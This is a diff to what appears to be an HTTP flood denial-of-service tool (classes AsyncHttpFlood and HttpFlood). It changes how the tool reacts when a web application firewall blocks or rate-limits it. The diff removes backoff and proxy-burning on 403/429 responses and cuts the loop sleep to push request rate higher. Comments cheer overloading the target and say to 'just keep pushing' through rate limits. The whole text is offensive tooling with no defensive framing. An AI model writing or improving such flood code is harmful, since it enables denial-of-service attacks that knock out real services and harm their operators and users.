@@ -1313,16 +1313,10 @@ class AsyncHttpFlood(Thread):
                 CONNECTIONS_SENT += 1
                 BYTES_SEND += 1000
                 
-                if resp.status_code in {403, 429}:
-                    # BURN THE SPECIFIC PROXY, NOT THE WHOLE LIST
-                    if proxy_url:
-                        # strip protocol if present
-                        p_key = proxy_url.replace("http://", "").replace("socks5://", "")
-                        BURNED_PROXIES[p_key] = time()
-                    # Trigger backoff signal (via exception caught by gather)
-                    raise Exception(f"WAF_BLOCK_{resp.status_code}")
-                elif resp.status_code >= 500:
+                if resp.status_code >= 500:
                     pass  # Target overloaded — good
+                elif resp.status_code in {403, 429}:
+                    pass  # Normal WAF response (captcha/rate limit) - just keep pushing
             except Exception as e:
                 Tools.track_error(e)
                 if "WAF_BLOCK" in str(e):
@@ -1368,12 +1362,9 @@ class AsyncHttpFlood(Thread):
                         batch_tasks = [self._flood_batch(client, batch_size=50, proxy_url=proxy_url) for _ in range(min(self._rpc, 10))]
                         await asyncio.gather(*batch_tasks, return_exceptions=False)
             except Exception as e:
-                # [V36] Rate Limit Detection & Evasion Backoff
-                if "WAF_BLOCK" in str(e):
-                    await asyncio.sleep(2.0)  # Evasion Backoff before rotating
-                else:
-                    Tools.track_error(e)
-                    await asyncio.sleep(0.5)
+                Tools.track_error(e)
+                # Keep sleep very tiny to yield loop momentarily, maximizing fire rate
+                await asyncio.sleep(0.01)
     
     def run(self):
         if self._synevent:
@@ -3393,7 +3384,7 @@ class HttpFlood(Thread):
                                 status_code = response_start.split(" ")[1]
                                 if status_code in {"403", "429"}:
                                     if hasattr(self, '_current_proxy'):
-                                        BURNED_PROXIES[self._current_proxy] = time()
+                                        #BURNED_PROXIES[self._current_proxy] = time()
                                     raise Exception("Proxy Blocked")
                         except Exception as e:
                             if "Blocked" in str(e): raise e
@@ -3490,7 +3481,7 @@ class HttpFlood(Thread):
                 
                 if resp.status_code in {403, 429}:
                     if self._proxies and hasattr(self, '_current_proxy'):
-                        BURNED_PROXIES[self._current_proxy] = time()
+                        #BURNED_PROXIES[self._current_proxy] = time()
                     break
         except Exception:
             pass
@@ -3710,7 +3701,7 @@ class HttpFlood(Thread):
                             if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                 status_code = response_start.split(" ")[1]
                                 if status_code in {"403", "429"}:
-                                    BURNED_PROXIES[self._current_proxy] = time()
+                                    #BURNED_PROXIES[self._current_proxy] = time()
                                     raise Exception("Proxy Blocked")
                         except (BlockingIOError, ssl.SSLWantReadError):
                             pass
@@ -3761,7 +3752,7 @@ class HttpFlood(Thread):
                             if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                 status_code = response_start.split(" ")[1]
                                 if status_code in {"403", "429"}:
-                                    BURNED_PROXIES[self._current_proxy] = time()
+                                    #BURNED_PROXIES[self._current_proxy] = time()
                                     raise Exception("Proxy Blocked")
                         except (BlockingIOError, ssl.SSLWantReadError):
                             pass
@@ -3848,7 +3839,7 @@ class HttpFlood(Thread):
                         print(f"[{int(CONNECTIONS_SENT)}] [STATUS {resp.status_code}] H2_FLOOD: Target Overloaded!")
                     elif resp.status_code in {403, 429}:
                         if proxy_url:
-                            BURNED_PROXIES[p_str] = time()
+                            #BURNED_PROXIES[p_str] = time()
                         raise Exception("Proxy Blocked")
                 
                 # [PHASE 13] Check if recycle target reached
@@ -4173,7 +4164,7 @@ class HttpFlood(Thread):
                                 status_code = response_start.split(" ")[1]
                                 if status_code in {"403", "429"}:
                                     if hasattr(self, '_current_proxy'):
-                                        BURNED_PROXIES[self._current_proxy] = time()
+                                        #BURNED_PROXIES[self._current_proxy] = time()
                                     raise Exception("Proxy Blocked")
                         except Exception as e:
                             if "Blocked" in str(e): raise e
@@ -4239,7 +4230,7 @@ class HttpFlood(Thread):
                                 status_code = response_start.split(" ")[1]
                                 if status_code in {"403", "429"}:
                                     if hasattr(self, '_current_proxy'):
-                                        BURNED_PROXIES[self._current_proxy] = time()
+                                        #BURNED_PROXIES[self._current_proxy] = time()
                                     break
                         except Exception as e:
                             pass
